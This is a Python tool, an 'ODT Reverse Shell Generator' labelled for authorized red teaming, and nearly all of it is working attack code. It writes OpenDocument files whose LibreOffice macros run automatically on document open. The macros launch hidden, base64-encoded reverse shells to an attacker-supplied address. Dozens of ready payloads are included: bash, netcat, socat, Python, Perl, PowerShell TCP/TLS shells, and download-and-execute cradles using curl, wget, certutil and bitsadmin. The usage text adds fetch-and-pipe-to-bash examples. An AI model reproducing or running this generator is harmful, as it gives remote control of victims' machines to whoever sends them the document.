#!/usr/bin/env python3
"""
ODT Reverse Shell Generator
Author: Abdulrahman Mustafa

Generates ODT files with embedded LibreOffice Basic macros
for reverse shell execution on document open.

For authorized red team / penetration testing engagements only.
"""

import argparse
import base64
import html
import sys
import zipfile
from collections import OrderedDict


# ---------------------------------------------------------------------------
# Macro builders
# ---------------------------------------------------------------------------

def _macro(program, params):
    esc_p = params.replace('"', '""')
    return f'Sub Main\n    Shell "{program}", 0, "{esc_p}"\nEnd Sub'


def _linux(cmd):
    if "'" not in cmd:
        return _macro("/bin/bash", f"-c '{cmd}'")
    encoded = base64.b64encode(cmd.encode()).decode()
    return _macro("/bin/bash", f"-c 'echo {encoded}|base64 -d|bash'")


def _windows_ps(ps_cmd):
    encoded = base64.b64encode(ps_cmd.encode("utf-16-le")).decode()
    return _macro("powershell.exe", f"-nop -w hidden -e {encoded}")


def _windows_cmd(cmd):
    return _macro("cmd.exe", f"/c {cmd}")


def _pre_cmd_shell_line(cmd, target_os):
    """Build a synchronous Shell line to prepend before the main payload."""
    if target_os == "linux":
        if "'" not in cmd:
            params = f"-c '{cmd}'"
        else:
            enc = base64.b64encode(cmd.encode()).decode()
            params = f"-c 'echo {enc}|base64 -d|bash'"
        esc = params.replace('"', '""')
        return f'    Shell "/bin/bash", 0, "{esc}", True'
    else:
        enc = base64.b64encode(cmd.encode("utf-16-le")).decode()
        return f'    Shell "powershell.exe", 0, "-nop -w hidden -e {enc}", True'


def inject_pre_cmds(macro, pre_cmds, target_os):
    """Inject synchronous pre-commands before the main payload in the macro."""
    lines = []
    for cmd in pre_cmds:
        lines.append(_pre_cmd_shell_line(cmd, target_os))
    insert = "\n".join(lines)
    return macro.replace("Sub Main\n", f"Sub Main\n{insert}\n", 1)


# ---------------------------------------------------------------------------
# Payload registry
# ---------------------------------------------------------------------------

def _build_linux_payloads():
    P = OrderedDict()

    def add(name, desc, requires, fn):
        P[name] = {"desc": desc, "requires": requires, "build": fn}

    # -- Bash --
    add("bash-tcp", "Bash /dev/tcp reverse shell", "bash",
        lambda ip, p, hp=80: _linux(f"bash -i >& /dev/tcp/{ip}/{p} 0>&1"))

    add("bash-udp", "Bash /dev/udp reverse shell", "bash",
        lambda ip, p, hp=80: _linux(f"bash -i >& /dev/udp/{ip}/{p} 0>&1"))

    # -- Netcat variants --
    add("nc-e", "Netcat -e reverse shell", "nc (traditional)",
        lambda ip, p, hp=80: _linux(f"nc -e /bin/bash {ip} {p}"))

    add("nc-c", "Netcat -c reverse shell", "nc (OpenBSD with -c)",
        lambda ip, p, hp=80: _linux(f"nc -c bash {ip} {p}"))

    add("nc-mkfifo", "Netcat mkfifo (no -e/-c)", "nc, mkfifo",
        lambda ip, p, hp=80: _linux(
            f"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc {ip} {p} >/tmp/f"))

    add("nc-mknod", "Netcat mknod pipe method", "nc, mknod",
        lambda ip, p, hp=80: _linux(
            f"mknod /tmp/bp p && nc {ip} {p} 0</tmp/bp | /bin/bash 1>/tmp/bp"))

    # -- Netcat download & execute --
    add("nc-download-wget", "Download nc via wget, then execute", "wget",
        lambda ip, p, hp=80: _linux(
            f"wget -q http://{ip}:{hp}/nc -O /tmp/nc && chmod +x /tmp/nc "
            f"&& /tmp/nc -e /bin/bash {ip} {p}"))

    add("nc-download-curl", "Download nc via curl, then execute", "curl",
        lambda ip, p, hp=80: _linux(
            f"curl -so /tmp/nc http://{ip}:{hp}/nc && chmod +x /tmp/nc "
            f"&& /tmp/nc -e /bin/bash {ip} {p}"))

    add("nc-download-fetch", "Download nc via fetch, then execute", "fetch (FreeBSD)",
        lambda ip, p, hp=80: _linux(
            f"fetch -qo /tmp/nc http://{ip}:{hp}/nc && chmod +x /tmp/nc "
            f"&& /tmp/nc -e /bin/bash {ip} {p}"))

    # -- Ncat --
    add("ncat", "Ncat (Nmap) reverse shell", "ncat",
        lambda ip, p, hp=80: _linux(f"ncat {ip} {p} -e /bin/bash"))

    add("ncat-ssl", "Ncat with SSL encryption", "ncat",
        lambda ip, p, hp=80: _linux(f"ncat --ssl {ip} {p} -e /bin/bash"))

    # -- Socat --
    add("socat", "Socat interactive PTY shell", "socat",
        lambda ip, p, hp=80: _linux(
            f"socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:{ip}:{p}"))

    # -- Python --
    def _py(ip, p, binary):
        cmd = (f"""{binary} -c 'import socket,subprocess,os;"""
               f"""s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);"""
               f"""s.connect(("{ip}",{p}));"""
               f"""os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);"""
               f"""subprocess.call(["/bin/bash","-i"])'""")
        return _linux(cmd)

    add("python", "Python 2 reverse shell", "python",
        lambda ip, p, hp=80: _py(ip, p, "python"))

    add("python3", "Python 3 reverse shell", "python3",
        lambda ip, p, hp=80: _py(ip, p, "python3"))

    # -- Perl --
    def _perl_linux(ip, p, hp=80):
        cmd = (f"""perl -e 'use Socket;$i="{ip}";$p={p};"""
               f"""socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));"""
               f"""if(connect(S,sockaddr_in($p,inet_aton($i))))"""
               f"""{{open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");"""
               f"""exec("/bin/bash -i")}};'""")
        return _linux(cmd)

    add("perl", "Perl reverse shell", "perl", _perl_linux)

    # -- PHP --
    def _php_linux(ip, p, hp=80):
        cmd = (f"""php -r '$sock=fsockopen("{ip}",{p});"""
               f"""$proc=proc_open("/bin/bash -i","""
               f"""array(0=>$sock,1=>$sock,2=>$sock),$pipes);'""")
        return _linux(cmd)

    add("php", "PHP reverse shell (proc_open)", "php", _php_linux)

    # -- Ruby --
    def _ruby_linux(ip, p, hp=80):
        cmd = (f"""ruby -rsocket -e 'f=TCPSocket.open("{ip}",{p}).to_i;"""
               f"""exec sprintf("/bin/bash -i <&%d >&%d 2>&%d",f,f,f)'""")
        return _linux(cmd)

    add("ruby", "Ruby reverse shell", "ruby", _ruby_linux)

    # -- Node.js --
    def _node_linux(ip, p, hp=80):
        cmd = (f"""node -e 'var net=require("net"),"""
               f"""sh=require("child_process").exec("/bin/bash");"""
               f"""var c=new net.Socket();"""
               f"""c.connect({p},"{ip}",function()"""
               f"""{{c.pipe(sh.stdin);sh.stdout.pipe(c);sh.stderr.pipe(c);}});'""")
        return _linux(cmd)

    add("node", "Node.js reverse shell", "node", _node_linux)

    # -- Telnet --
    add("telnet", "Telnet mkfifo reverse shell", "telnet, mkfifo",
        lambda ip, p, hp=80: _linux(
            f"TF=$(mktemp -u);mkfifo $TF && telnet {ip} {p} 0<$TF | /bin/bash 1>$TF"))

    # -- OpenSSL --
    add("openssl", "OpenSSL encrypted reverse shell", "openssl, mkfifo",
        lambda ip, p, hp=80: _linux(
            f"mkfifo /tmp/s;/bin/bash -i < /tmp/s 2>&1"
            f"|openssl s_client -quiet -connect {ip}:{p} > /tmp/s;rm /tmp/s"))

    # -- AWK --
    def _awk_linux(ip, p, hp=80):
        cmd = (f"""awk 'BEGIN{{s="/inet/tcp/0/{ip}/{p}";"""
               f"""while(42){{do{{printf "$ "|&s;s|&getline c;"""
               f"""if(c){{while((c|&getline)>0)print $0|&s;close(c)}}"""
               f"""}}while(c!="exit")close(s)}}}}'""")
        return _linux(cmd)

    add("awk", "AWK /inet reverse shell", "gawk", _awk_linux)

    # -- Lua --
    def _lua_linux(ip, p, hp=80):
        cmd = (f"""lua -e 'local s=require("socket");"""
               f"""local t=assert(s.tcp());t:connect("{ip}",{p});"""
               f"""while true do local r,x=t:receive();"""
               f"""local f=assert(io.popen(r,"r"));"""
               f"""local b=assert(f:read("*a"));t:send(b);end;"""
               f"""f:close();t:close();'""")
        return _linux(cmd)

    add("lua", "Lua (luasocket) reverse shell", "lua, luasocket", _lua_linux)

    return P


def _build_windows_payloads():
    P = OrderedDict()

    def add(name, desc, requires, fn):
        P[name] = {"desc": desc, "requires": requires, "build": fn}

    # -- PowerShell (standard) --
    def _ps_standard(ip, p, hp=80):
        ps = (f"$c=New-Object System.Net.Sockets.TCPClient('{ip}',{p});"
              "$s=$c.GetStream();"
              "[byte[]]$b=0..65535|%{0};"
              "while(($i=$s.Read($b,0,$b.Length)) -ne 0)"
              "{$d=(New-Object System.Text.ASCIIEncoding).GetString($b,0,$i);"
              "$r=(iex $d 2>&1|Out-String);"
              "$r2=$r+'PS '+(pwd).Path+'> ';"
              "$sb=([Text.Encoding]::ASCII).GetBytes($r2);"
              "$s.Write($sb,0,$sb.Length);"
              "$s.Flush()};"
              "$c.Close()")
        return _windows_ps(ps)

    add("powershell", "PowerShell TCPClient (base64)", "powershell", _ps_standard)

    # -- PowerShell with error handling --
    def _ps_trycatch(ip, p, hp=80):
        ps = (f"$c=New-Object System.Net.Sockets.TCPClient('{ip}',{p});"
              "$s=$c.GetStream();"
              "[byte[]]$b=0..65535|%{0};"
              "while(($i=$s.Read($b,0,$b.Length)) -ne 0)"
              "{$d=(New-Object System.Text.ASCIIEncoding).GetString($b,0,$i);"
              "try{$r=(iex $d 2>&1|Out-String)}catch{$r=$_.Exception.Message};"
              "$r2=$r+'PS '+(pwd).Path+'> ';"
              "$sb=([Text.Encoding]::ASCII).GetBytes($r2);"
              "$s.Write($sb,0,$sb.Length);"
              "$s.Flush()};"
              "$c.Close()")
        return _windows_ps(ps)

    add("powershell-trycatch", "PowerShell with error handling", "powershell",
        _ps_trycatch)

    # -- PowerShell TLS --
    def _ps_tls(ip, p, hp=80):
        ps = (f"$c=New-Object System.Net.Sockets.TCPClient('{ip}',{p});"
              "$s=$c.GetStream();"
              "$ssl=New-Object System.Net.Security.SslStream($s,$false,({$true}));"
              f"$ssl.AuthenticateAsClient('{ip}');"
              "[byte[]]$b=0..65535|%{0};"
              "while(($i=$ssl.Read($b,0,$b.Length)) -ne 0)"
              "{$d=(New-Object System.Text.ASCIIEncoding).GetString($b,0,$i);"
              "$r=(iex $d 2>&1|Out-String);"
              "$sb=([Text.Encoding]::ASCII).GetBytes($r);"
              "$ssl.Write($sb,0,$sb.Length);"
              "$ssl.Flush()};"
              "$c.Close()")
        return _windows_ps(ps)

    add("powershell-tls", "PowerShell TLS encrypted shell", "powershell",
        _ps_tls)

    # -- PowerShell one-liners (no base64) --
    def _ps_oneliner(ip, p, hp=80):
        ps = (f"$c=New-Object System.Net.Sockets.TCPClient('{ip}',{p});"
              "$s=$c.GetStream();"
              "[byte[]]$b=0..65535|%{0};"
              "while(($i=$s.Read($b,0,$b.Length)) -ne 0)"
              "{$d=(New-Object System.Text.ASCIIEncoding).GetString($b,0,$i);"
              "$r=(iex $d 2>&1|Out-String);"
              "$r2=$r+'PS '+(pwd).Path+'> ';"
              "$sb=([Text.Encoding]::ASCII).GetBytes($r2);"
              "$s.Write($sb,0,$sb.Length);"
              "$s.Flush()};"
              "$c.Close()")
        return _macro("powershell.exe", f"-nop -w hidden -c {ps}")

    add("ps-oneliner", "PowerShell TCPClient inline (no base64)", "powershell",
        _ps_oneliner)

    def _ps_oneliner_trycatch(ip, p, hp=80):
        ps = (f"$c=New-Object System.Net.Sockets.TCPClient('{ip}',{p});"
              "$s=$c.GetStream();"
              "[byte[]]$b=0..65535|%{0};"
              "while(($i=$s.Read($b,0,$b.Length)) -ne 0)"
              "{$d=(New-Object System.Text.ASCIIEncoding).GetString($b,0,$i);"
              "try{$r=(iex $d 2>&1|Out-String)}catch{$r=$_.Exception.Message};"
              "$r2=$r+'PS '+(pwd).Path+'> ';"
              "$sb=([Text.Encoding]::ASCII).GetBytes($r2);"
              "$s.Write($sb,0,$sb.Length);"
              "$s.Flush()};"
              "$c.Close()")
        return _macro("powershell.exe", f"-nop -w hidden -c {ps}")

    add("ps-oneliner-trycatch", "PowerShell inline with error handling", "powershell",
        _ps_oneliner_trycatch)

    # -- PowerShell download cradles --
    def _ps_download_cradle(ip, p, hp=80):
        return _macro("powershell.exe",
                      f"-nop -w hidden -c IEX(New-Object Net.WebClient).DownloadString('http://{ip}:{hp}/rev.ps1')")

    add("ps-download-cradle", "Download cradle (Net.WebClient)",
        "powershell, http server", _ps_download_cradle)

    def _ps_download_iwr(ip, p, hp=80):
        return _macro("powershell.exe",
                      f"-nop -w hidden -c IEX(Invoke-WebRequest -Uri http://{ip}:{hp}/rev.ps1 -UseBasicParsing).Content")

    add("ps-download-iwr", "Download cradle (Invoke-WebRequest)",
        "powershell 3.0+, http server", _ps_download_iwr)

    # -- nc.exe --
    add("nc", "nc.exe -e cmd.exe", "nc.exe on target",
        lambda ip, p, hp=80: _windows_cmd(f"nc.exe -e cmd.exe {ip} {p}"))

    # -- nc.exe download & execute --
    def _nc_dl_certutil(ip, p, hp=80):
        ps = (f"certutil -urlcache -f http://{ip}:{hp}/nc.exe "
              f"C:\\Windows\\Temp\\nc.exe; "
              f"C:\\Windows\\Temp\\nc.exe -e cmd.exe {ip} {p}")
        return _windows_ps(ps)

    add("nc-download-certutil", "Download nc.exe via certutil, then execute",
        "certutil", _nc_dl_certutil)

    def _nc_dl_ps(ip, p, hp=80):
        ps = (f"Invoke-WebRequest -Uri http://{ip}:{hp}/nc.exe "
              f"-OutFile C:\\Windows\\Temp\\nc.exe; "
              f"C:\\Windows\\Temp\\nc.exe -e cmd.exe {ip} {p}")
        return _windows_ps(ps)

    add("nc-download-ps", "Download nc.exe via PowerShell, then execute",
        "powershell", _nc_dl_ps)

    def _nc_dl_bitsadmin(ip, p, hp=80):
        ps = (f"bitsadmin /transfer nc /download /priority high "
              f"http://{ip}:{hp}/nc.exe C:\\Windows\\Temp\\nc.exe; "
              f"C:\\Windows\\Temp\\nc.exe -e cmd.exe {ip} {p}")
        return _windows_ps(ps)

    add("nc-download-bitsadmin", "Download nc.exe via bitsadmin, then execute",
        "bitsadmin", _nc_dl_bitsadmin)

    # -- Python (Windows) --
    def _py_win(ip, p, hp=80):
        ps = (f"""& python -c 'import socket,subprocess,os;"""
              f"""s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);"""
              f"""s.connect(("{ip}",{p}));"""
              f"""os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);"""
              f"""subprocess.call(["cmd.exe"])'""")
        return _windows_ps(ps)

    add("python", "Python reverse shell via PowerShell", "python, powershell",
        _py_win)

    # -- Perl (Windows) --
    def _perl_win(ip, p, hp=80):
        ps = (f"""& perl -e 'use Socket;$i="{ip}";$p={p};"""
              f"""socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));"""
              f"""if(connect(S,sockaddr_in($p,inet_aton($i))))"""
              f"""{{open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");"""
              f"""exec("cmd.exe")}};'""")
        return _windows_ps(ps)

    add("perl", "Perl reverse shell via PowerShell", "perl, powershell",
        _perl_win)

    # -- Ruby (Windows) --
    def _ruby_win(ip, p, hp=80):
        ps = (f"""& ruby -rsocket -e "c=TCPSocket.new('{ip}',{p});"""
              f"""while(cmd=c.gets);IO.popen(cmd,'r'){{|io|c.print io.read}}end\"""")
        return _windows_ps(ps)

    add("ruby", "Ruby reverse shell via PowerShell", "ruby, powershell",
        _ruby_win)

    # -- Node.js (Windows) --
    def _node_win(ip, p, hp=80):
        ps = (f"""& node -e "var net=require('net'),"""
              f"""sh=require('child_process').exec('cmd.exe');"""
              f"""var c=new net.Socket();"""
              f"""c.connect({p},'{ip}',function()"""
              f"""{{c.pipe(sh.stdin);sh.stdout.pipe(c);sh.stderr.pipe(c);}});\"""")
        return _windows_ps(ps)

    add("node", "Node.js reverse shell via PowerShell", "node, powershell",
        _node_win)

    return P


PAYLOADS = {
    "linux": _build_linux_payloads(),
    "windows": _build_windows_payloads(),
}


# ---------------------------------------------------------------------------
# ODT XML templates
# ---------------------------------------------------------------------------

MIMETYPE = "application/vnd.oasis.opendocument.text"

CONTENT_XML = """\
<?xml version="1.0" encoding="UTF-8"?>
<office:document-content
  xmlns:office="urn:oasis:names:tc:opendocument:xmlns:office:1.0"
  xmlns:text="urn:oasis:names:tc:opendocument:xmlns:text:1.0"
  xmlns:script="urn:oasis:names:tc:opendocument:xmlns:script:1.0"
  xmlns:xlink="http://www.w3.org/1999/xlink"
  office:version="1.2">
  <office:scripts>
    <office:event-listeners>
      <script:event-listener
        script:language="ooo:script"
        script:event-name="dom:load"
        xlink:href="vnd.sun.star.script:Standard.Module1.Main?language=Basic&amp;location=document"
        xlink:type="simple"/>
    </office:event-listeners>
  </office:scripts>
  <office:body>
    <office:text>
      <text:p/>
    </office:text>
  </office:body>
</office:document-content>"""

STYLES_XML = """\
<?xml version="1.0" encoding="UTF-8"?>
<office:document-styles
  xmlns:office="urn:oasis:names:tc:opendocument:xmlns:office:1.0"
  office:version="1.2">
</office:document-styles>"""

META_XML = """\
<?xml version="1.0" encoding="UTF-8"?>
<office:document-meta
  xmlns:office="urn:oasis:names:tc:opendocument:xmlns:office:1.0"
  xmlns:meta="urn:oasis:names:tc:opendocument:xmlns:meta:1.0"
  office:version="1.2">
  <office:meta>
    <meta:generator>LibreOffice</meta:generator>
  </office:meta>
</office:document-meta>"""

SCRIPT_LB = """\
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE library:library PUBLIC "-//OpenOffice.org//DTD OfficeDocument 1.0//EN" "library.dtd">
<library:library
  xmlns:library="http://openoffice.org/2000/library"
  library:name="Standard"
  library:readonly="false"
  library:passwordprotected="false">
  <library:element library:name="Module1"/>
</library:library>"""

SCRIPT_LC = """\
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE library:libraries PUBLIC "-//OpenOffice.org//DTD OfficeDocument 1.0//EN" "libraries.dtd">
<library:libraries
  xmlns:library="http://openoffice.org/2000/library"
  xmlns:xlink="http://www.w3.org/1999/xlink">
  <library:library
    library:name="Standard"
    xlink:href="Basic/Standard/script-lb.xml"
    xlink:type="simple"
    library:link="false"/>
</library:libraries>"""

MANIFEST_XML = """\
<?xml version="1.0" encoding="UTF-8"?>
<manifest:manifest
  xmlns:manifest="urn:oasis:names:tc:opendocument:xmlns:manifest:1.0"
  manifest:version="1.2">
  <manifest:file-entry manifest:full-path="/"
    manifest:version="1.2"
    manifest:media-type="application/vnd.oasis.opendocument.text"/>
  <manifest:file-entry manifest:full-path="content.xml" manifest:media-type="text/xml"/>
  <manifest:file-entry manifest:full-path="styles.xml" manifest:media-type="text/xml"/>
  <manifest:file-entry manifest:full-path="meta.xml" manifest:media-type="text/xml"/>
  <manifest:file-entry manifest:full-path="Basic/" manifest:media-type=""/>
  <manifest:file-entry manifest:full-path="Basic/Standard/" manifest:media-type=""/>
  <manifest:file-entry manifest:full-path="Basic/Standard/Module1.xml" manifest:media-type="text/xml"/>
  <manifest:file-entry manifest:full-path="Basic/Standard/script-lb.xml" manifest:media-type="text/xml"/>
  <manifest:file-entry manifest:full-path="Basic/script-lc.xml" manifest:media-type="text/xml"/>
</manifest:manifest>"""


# ---------------------------------------------------------------------------
# ODT generator
# ---------------------------------------------------------------------------

def build_module_xml(macro_code):
    return (
        '<?xml version="1.0" encoding="UTF-8"?>\n'
        '<!DOCTYPE script:module PUBLIC '
        '"-//OpenOffice.org//DTD OfficeDocument 1.0//EN" "module.dtd">\n'
        '<script:module xmlns:script="http://openoffice.org/2000/script"\n'
        '  script:name="Module1"\n'
        f'  script:language="StarBasic">{html.escape(macro_code)}</script:module>'
    )


def generate_odt(ip, port, target_os, output, macro, label):
    with zipfile.ZipFile(output, "w", zipfile.ZIP_DEFLATED) as zf:
        zf.writestr("mimetype", MIMETYPE, compress_type=zipfile.ZIP_STORED)
        zf.writestr("content.xml", CONTENT_XML)
        zf.writestr("styles.xml", STYLES_XML)
        zf.writestr("meta.xml", META_XML)
        zf.writestr("Basic/Standard/Module1.xml", build_module_xml(macro))
        zf.writestr("Basic/Standard/script-lb.xml", SCRIPT_LB)
        zf.writestr("Basic/script-lc.xml", SCRIPT_LC)
        zf.writestr("META-INF/manifest.xml", MANIFEST_XML)

    print(f"[+] Payload:  {label}")
    print(f"[+] Target:   {target_os}")
    print(f"[+] Callback: {ip}:{port}")
    print(f"[+] Output:   {output}")
    print(f"[+] Macro triggers on document open (requires macros enabled)")


# ---------------------------------------------------------------------------
# CLI
# ---------------------------------------------------------------------------

def list_payloads(target_os):
    payloads = PAYLOADS[target_os]
    print(f"\n  Available {target_os} payloads ({len(payloads)}):\n")
    print(f"  {'NAME':<26} {'REQUIRES':<24} DESCRIPTION")
    print(f"  {'─' * 26} {'─' * 24} {'─' * 40}")
    for name, info in payloads.items():
        print(f"  {name:<26} {info['requires']:<24} {info['desc']}")
    print()


def main():
    parser = argparse.ArgumentParser(
        description="ODT Reverse Shell Generator — Red Team Tool",
        epilog=(
            "examples:\n"
            "  %(prog)s 10.10.14.5 4444\n"
            "  %(prog)s 10.10.14.5 4444 --os windows --payload powershell-tls\n"
            "  %(prog)s 10.10.14.5 4444 --os windows -p ps-oneliner\n"
            "  %(prog)s 10.10.14.5 4444 --os windows -p ps-download-cradle --http-port 8080\n"
            "  %(prog)s 10.10.14.5 9001 --payload nc-mkfifo -o doc.odt\n"
            "  %(prog)s 10.10.14.5 4444 -p nc-download-wget --http-port 8080\n"
            "  %(prog)s 10.10.14.5 4444 --os windows -p nc-download-certutil --http-port 8000\n"
            "  %(prog)s 10.10.14.5 4444 --cmd 'curl http://10.10.14.5/shell.sh|bash'\n"
            "  %(prog)s 10.10.14.5 4444 --pre-cmd 'mkdir -p /tmp/.hidden'\n"
            "  %(prog)s 10.10.14.5 4444 --pre-cmd 'whoami > /tmp/w' --pre-cmd 'id >> /tmp/w'\n"
            "  %(prog)s --list --os linux\n"
            "  %(prog)s --list --os windows\n"
            "\n"
            "start a listener:\n"
            "  nc -lvnp 4444\n"
            "  ncat --ssl -lvnp 4444        (for ncat-ssl / powershell-tls)\n"
            "  openssl s_server -quiet -key key.pem -cert cert.pem -port 4444\n"
            "\n"
            "host nc for download payloads:\n"
            "  python3 -m http.server 8080   (serve nc/nc.exe from cwd)\n"
            "\n"
            "author: Abdulrahman Mustafa\n"
        ),
        formatter_class=argparse.RawDescriptionHelpFormatter,
    )
    parser.add_argument("ip", nargs="?", help="Listener IP address")
    parser.add_argument("port", nargs="?", type=int, help="Listener port (1-65535)")
    parser.add_argument(
        "--os", choices=["linux", "windows"], default="linux",
        dest="target_os", help="Target OS (default: linux)",
    )
    parser.add_argument(
        "--payload", "-p", default=None,
        help="Payload type (default: bash-tcp / powershell). Use --list to see all",
    )
    parser.add_argument(
        "-o", "--output", default="revshell.odt",
        help="Output filename (default: revshell.odt)",
    )
    parser.add_argument(
        "--list", "-l", action="store_true",
        help="List available payloads for the selected OS",
    )
    parser.add_argument(
        "--http-port", type=int, default=80,
        help="Attacker HTTP port for download payloads (default: 80)",
    )
    parser.add_argument(
        "--cmd", default=None, metavar="COMMAND",
        help="Custom command to execute instead of a predefined payload",
    )
    parser.add_argument(
        "--pre-cmd", action="append", default=[], metavar="COMMAND",
        help="Command(s) to run before the main payload (can be repeated)",
    )

    args = parser.parse_args()

    if args.list:
        list_payloads(args.target_os)
        sys.exit(0)

    if not args.ip or args.port is None:
        parser.error("IP and PORT are required (unless using --list)")

    if not 1 <= args.port <= 65535:
        parser.error("port must be between 1 and 65535")

    if args.http_port and not 1 <= args.http_port <= 65535:
        parser.error("--http-port must be between 1 and 65535")

    # Build the macro
    payload_name = None
    if args.cmd:
        if args.target_os == "linux":
            macro = _linux(args.cmd)
        else:
            macro = _macro("powershell.exe", f"-nop -w hidden -c {args.cmd}")
        label = f"custom — {args.cmd[:60]}"
    else:
        defaults = {"linux": "bash-tcp", "windows": "powershell"}
        payload_name = args.payload or defaults[args.target_os]

        if payload_name not in PAYLOADS[args.target_os]:
            available = ", ".join(PAYLOADS[args.target_os].keys())
            parser.error(
                f"payload '{payload_name}' not available for {args.target_os}. "
                f"Choose from: {available}"
            )

        payload = PAYLOADS[args.target_os][payload_name]
        macro = payload["build"](args.ip, args.port, args.http_port)
        label = f"{payload_name} — {payload['desc']}"

        if (payload_name.startswith("nc-download") or payload_name.startswith("ps-download")) and args.http_port != 80:
            label += f" (http:{args.http_port})"

    # Inject pre-commands
    if args.pre_cmd:
        macro = inject_pre_cmds(macro, args.pre_cmd, args.target_os)
        for cmd in args.pre_cmd:
            print(f"[+] Pre-cmd:  {cmd}")

    generate_odt(args.ip, args.port, args.target_os, args.output, macro, label)

    if payload_name and payload_name.startswith("ps-download"):
        print(f"\n[*] Host rev.ps1 on port {args.http_port}:")
        print(f"    python3 -m http.server {args.http_port}")


if __name__ == "__main__":
    main()
